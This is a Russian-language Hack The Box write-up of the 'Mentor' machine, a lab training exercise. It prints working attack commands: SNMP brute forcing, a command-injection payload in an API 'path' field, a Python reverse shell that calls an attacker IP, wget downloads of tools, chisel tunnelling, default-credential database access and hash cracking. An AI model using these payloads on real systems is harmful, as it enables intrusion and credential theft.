# Mentor (HTB)

> Платформа: Hack The Box  
> ОС: Linux  
> Сложность: Средне  
> Результат: root

---

## Цепочка Атаки

```text
Разведка
├── nmap -p- --min-rate 5000 → 22 (SSH), 80 (Apache)
├── UDP scan → 161 (SNMP)
└── /etc/hosts: 10.129.115.144 mentorquotes.htb api.mentorquotes.htb

Первичный Доступ (SNMP + API)
├── ffuf (Host: FUZZ.mentorquotes.htb) → api.mentorquotes.htb
├── snmpbrute.py → community string "internal"
├── snmpwalk -v2c -c internal → /usr/local/bin/login.py <PASSWORD>
├── API /auth/signup + /auth/login → n3xu6 JWT
├── API /auth/login (james) → james JWT
└── /admin/backup (POST) → Blind RCE via path parameter

Боковое Перемещение (Container escape)
├── Python reverse shell (pty.spawn) → uid=0(root) in Alpine container
├── .dockerenv detected
├── wget static nmap → /tmp/nmap
├── /tmp/nmap -sn 172.22.0.0/24 → docker_web_1 (172.22.0.2), docker_postgres_1 (172.22.0.4)
├── chisel tunnel → R:127.0.0.1:8002:172.22.0.4:5432
├── psql -h 127.0.0.1 -p 8002 -U postgres → mentorquotes_db
├── SELECT * FROM users; → service_acc MD5 hash
└── hashcat -m 0 → <PASSWORD>

Флаг Пользователя
├── ssh svc@mentor.htb (password <PASSWORD>)
└── cat /home/svc/user.txt → <USER_FLAG>

Повышение Привилегий
├── cat /etc/snmp/snmpd.conf → createUser bootstrap MD5 <PASSWORD> DES
├── su james (password <PASSWORD>)
├── sudo -l → (ALL) /bin/sh
└── sudo /bin/sh → root
```

> [!NOTE]
> Все флаги, пароли, хеши и токены сессий были замаскированы по этическим соображениям.

---

## Брифинг Машины

Mentor - это машина средней сложности на Linux, включающая сервис SNMP со слабой строкой сообщества, API с уязвимостью Blind Command Injection и контейнер PostgreSQL, доступный через сеть Docker. Путь включает пивотинг через нескольких пользователей и контейнеры до получения root через неправильно настроенное правило sudo.

---

## Разведка

### Сканирование Портов

```bash
nmap -p- --min-rate 5000 -T4 -Pn -n 10.129.115.144
```

| Порт | Сервис | Версия |
|------|---------|---------|
| 22   | SSH     | OpenSSH 8.9p1 Ubuntu 3 |
| 80   | HTTP    | Apache httpd 2.4.52 |

```bash
echo "10.129.115.144 mentorquotes.htb api.mentorquotes.htb" | sudo tee -a /etc/hosts
```

### Перечисление vHost

```bash
ffuf -u http://10.129.115.144 -H "Host: FUZZ.mentorquotes.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,404 -fs 0
```

Результат: `api` (Статус: 404, Размер: 22).

---

## Первичный Доступ (SNMP + API)

No CVE (custom vulnerability) - строка сообщества SNMP раскрывает учётные данные API, и API принимает неочищенный ввод, который доходит до шелла (слепой RCE).

### Перечисление SNMP

```bash
sudo nmap -sU -F -Pn -n 10.129.115.144
```

| Порт | Сервис |
|------|---------|
| 161  | SNMP    |

Строка сообщества по умолчанию `public` не дает полезной информации. Брутфорс для нахождения `internal`:

```bash
python3 snmpbrute.py -t 10.129.115.144 -f /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
```

Результат: `internal` (v2c)(RO).

Извлечение аргументов процессов:

```bash
snmpwalk -v2c -c internal 10.129.115.144 .1.3.6.1.2.1.25.4.2.1.5 | grep login.py
```

```text
iso.3.6.1.2.1.25.4.2.1.5.2078 = STRING: "/usr/local/bin/login.py <PASSWORD>"
```

### API Регистрация / Вход

```bash
curl -s -X POST http://api.mentorquotes.htb/auth/signup -H 'Content-Type: application/json' -d '{"email": "n3xu6@mentor.htb", "username": "n3xu6", "password": "password123"}'
curl -s -X POST http://api.mentorquotes.htb/auth/login -H 'Content-Type: application/json' -d '{"email": "n3xu6@mentor.htb", "username": "n3xu6", "password": "password123"}'
```

Токен не имеет доступа администратора:

```bash
curl -s http://api.mentorquotes.htb/admin/ -H 'Authorization: <JWT_TOKEN>'
```

```json
{"detail":"Only admin users can access this resource"}
```

Логин как `james` с паролем, найденным через SNMP:

```bash
curl -s -X POST http://api.mentorquotes.htb/auth/login -H 'Content-Type: application/json' -d '{"email": "james@mentorquotes.htb", "username": "james", "password": "<PASSWORD>"}'
```

### Blind RCE

Проверка эндпоинта `/admin/backup`:

```bash
curl -i -s http://api.mentorquotes.htb/admin/backup -H 'Authorization: <JWT_TOKEN>'
```

```text
HTTP/1.1 405 Method Not Allowed
{"detail":"Method Not Allowed"}
```

Тест POST с пустым JSON:

```bash
curl -s -X POST http://api.mentorquotes.htb/admin/backup -H 'Authorization: <JWT_TOKEN>' -H 'Content-Type: application/json' -d '{}'
```

```json
{"detail":[{"loc":["body","path"],"msg":"field required","type":"value_error.missing"}]}
```

Инъекция команды `wget` для подтверждения слепого выполнения:

```bash
curl -s -X POST http://api.mentorquotes.htb/admin/backup -H 'Authorization: <JWT_TOKEN>' -H 'Content-Type: application/json' -d '{"path": "test; wget http://10.10.15.20:8000/test"}'
```

Сервер добавляет `/app_backkup.tar` в конец команды, поэтому запрос выглядит как `GET /test/app_backkup.tar`. Это подтверждает выполнение.

### Reverse Shell

Поскольку `/bin/bash` и `nc -e` недоступны в контейнере Alpine, используем Python reverse shell:

```bash
curl -s -X POST http://api.mentorquotes.htb/admin/backup -H 'Authorization: <JWT_TOKEN>' -H 'Content-Type: application/json' -d '{"path": "test; python3 -c \"import socket,os,pty;s=socket.socket();s.connect((\u002710.10.15.20\u0027,4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\u0027/bin/sh\u0027)\"; #"}'
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Шелл как `root` в Docker-контейнере Alpine.

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

---

## Боковое Перемещение (Container escape)

Проверка на наличие Docker-окружения:

```bash
ls -la /
```

```text
-rwxr-xr-x    1 root     root             0 Oct 24 11:40 .dockerenv
```

Скачиваем статический `nmap` и сканируем внутреннюю сеть:

```bash
wget http://10.10.15.20:8000/nmap -O /tmp/nmap
chmod +x /tmp/nmap
/tmp/nmap -sn 172.22.0.0/24
```

```text
Nmap scan report for docker_web_1.docker_vpcbr (172.22.0.2)
Nmap scan report for docker_postgres_1.docker_vpcbr (172.22.0.4)
```

Сканируем порт PostgreSQL:

```bash
/tmp/nmap -p 5432 172.22.0.0/24
```

```text
PORT     STATE SERVICE
5432/tcp open  postgresql
```

Скачиваем `chisel` и создаем туннель:

```bash
wget http://10.10.15.20:8000/chisel -O /tmp/chisel
chmod +x /tmp/chisel
```

Запуск сервера на Kali:

```bash
./chisel server -p 8001 --reverse
```

Подключение из контейнера:

```bash
/tmp/chisel client 10.10.15.20:8001 R:127.0.0.1:8002:172.22.0.4:5432
```

### Доступ к PostgreSQL

Подключение к базе данных с использованием учетных данных по умолчанию:

```bash
psql -h 127.0.0.1 -p 8002 -U postgres
```

Пароль: `postgres`.

Список баз данных:

```sql
\l
```

```text
mentorquotes_db
```

Подключение и дамп пользователей:

```sql
\c mentorquotes_db
SELECT * FROM users;
```

```text
 id |         email          |  username   |             password             
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | <MD5_HASH>
  2 | svc@mentorquotes.htb   | service_acc | <MD5_HASH>
```

Взлом MD5-хеша для `service_acc`:

```bash
echo "<MD5_HASH>" > svc.hash
hashcat -m 0 svc.hash /usr/share/wordlists/rockyou.txt
```

```text
<MD5_HASH>:<PASSWORD>
```

### Флаг Пользователя

Вход как `svc` через SSH (имя пользователя не `service_acc`):

```bash
ssh svc@10.129.115.144
```

Пароль: `<PASSWORD>`.

```bash
cat /home/svc/user.txt
# <USER_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Повышение Привилегий

Файл конфигурации SNMP содержит пароль в открытом виде для `james`:

```bash
cat /etc/snmp/snmpd.conf
```

```text
createUser bootstrap MD5 <PASSWORD> DES
```

Переключение на `james`:

```bash
su james
```

Пароль: `<PASSWORD>`.

Проверка привилегий sudo:

```bash
sudo -l
```

```text
User james may run the following commands on mentor:
    (ALL) /bin/sh
```

Получение шелла root:

```bash
sudo /bin/sh
```

```bash
whoami
# root
cat /root/root.txt
# <ROOT_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Флаги

| Флаг | Значение                         |
|------|----------------------------------|
| User | <USER_FLAG> |
| Root | <ROOT_FLAG> |

---

## Ключевые Выводы

- **Строки сообщества SNMP** могут раскрывать конфиденциальные аргументы процессов. Всегда брутфорсьте помимо дефолтного `public`.
- **API Blind Command Injection** можно эксплуатировать, используя `;` и `#` для обхода добавленных суффиксов.
- **В контейнерах Alpine** нет `/bin/bash` и `nc -e`; используйте Python для reverse shell.
- **Сети Docker** требуют пивотинга через `chisel` или аналогичные инструменты.
- **Учетные данные PostgreSQL по умолчанию** - критическая находка.
- **Файлы конфигурации** (например, `/etc/snmp/snmpd.conf`) часто содержат пароли в открытом виде для других пользователей.
- **Неправильные настройки sudo**, такие как `(ALL) /bin/sh`, мгновенно дают root.